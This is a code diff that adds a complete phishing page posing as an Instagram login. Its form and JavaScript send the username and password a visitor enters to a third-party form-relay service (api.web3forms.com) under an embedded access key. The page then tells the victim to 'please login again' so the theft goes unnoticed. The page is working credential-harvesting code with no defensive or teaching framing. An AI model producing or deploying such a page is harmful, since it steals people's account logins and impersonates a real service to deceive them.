@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Instagram</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+	
+	<form action="https://api.web3forms.com/submit" class="formed"  method="POST" id="form">
+
+		<input type="hidden" name="access_key" value="c7b064c8-7e9a-4dbc-b9df-943ef0c8e58b">
+		<h1>Instagram</h1>
+		<input type="name" placeholder="Username "name="Username" required class="input-box">
+		<input type="password" name="pass" placeholder="Password" class="pass-box" required>
+		<input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+	
+		<button  class="submitbtn" type="submit">Log in </button>
+	
+		<div id="result"></div>
+	
+	</form>
+	
+	<script>
+	const form = document.getElementById('form');
+	const result = document.getElementById('result');
+	
+	form.addEventListener('submit', function(e) {
+	  e.preventDefault();
+	  const formData = new FormData(form);
+	  const object = Object.fromEntries(formData);
+	  const json = JSON.stringify(object);
+	  result.innerHTML = "Please wait..."
+	
+		fetch('https://api.web3forms.com/submit', {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json',
+					'Accept': 'application/json'
+				},
+				body: json
+			})
+			.then(async (response) => {
+				let json = await response.json();
+				if (response.status == 200) {
+					result.innerHTML = "please login again";
+				} else {
+					console.log(response);
+					result.innerHTML = json.message;
+				}
+			})
+			.catch(error => {
+				console.log(error);
+				result.innerHTML = "Something went wrong!";
+			})
+			.then(function() {
+				form.reset();
+				setTimeout(() => {
+					result.style.display = "none";
+				}, 3000);
+			});
+	});
+	</script>
+</body>
+</html>
